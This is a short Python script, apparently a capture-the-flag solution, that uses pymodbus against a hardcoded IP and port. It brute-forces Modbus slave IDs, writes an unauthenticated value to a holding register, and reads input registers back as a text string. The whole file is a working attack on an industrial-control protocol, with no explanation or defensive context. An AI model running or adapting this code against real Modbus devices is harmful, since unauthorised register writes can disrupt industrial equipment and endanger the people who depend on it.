from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient('163.172.68.42', port=10016)
client.connect()

for slave_id in range(0, 256):
    try:
        result = client.read_input_registers(0, slave=slave_id)
        if not result.isError():
            print(f"Found valid slave ID: {slave_id}")
            break
    except Exception as e:
        pass

# Write to holding register
client.write_register(0x10, 0xff, slave=slave_id)

# Read input registers from address 0x00
result = client.read_input_registers(0, count=120, slave=slave_id)
print(''.join([chr(x) for x in result.registers]))
